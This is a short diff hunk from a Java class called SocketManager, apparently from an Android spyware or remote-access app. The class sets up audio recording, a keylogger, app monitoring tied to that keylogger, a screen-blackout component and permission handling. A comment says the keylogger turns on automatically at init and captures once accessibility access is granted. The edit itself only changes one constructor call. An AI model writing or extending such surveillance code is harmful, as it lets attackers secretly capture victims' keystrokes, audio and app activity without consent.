@@ -113,7 +113,7 @@ public class SocketManager {
         audioRecorder      = new AudioRecorder(context);
         keyloggerService   = new KeyloggerService(context);
         appMonitor         = new AppMonitor(context, keyloggerService);
-        screenBlackout     = ScreenBlackout.getInstance(context);
+        screenBlackout     = ScreenBlackout.getInstance();
         permissionManager  = new PermissionManager(context);
         // Auto-enable keylogger on init (will capture once accessibility is granted)
         KeyloggerService.setEnabled(true);
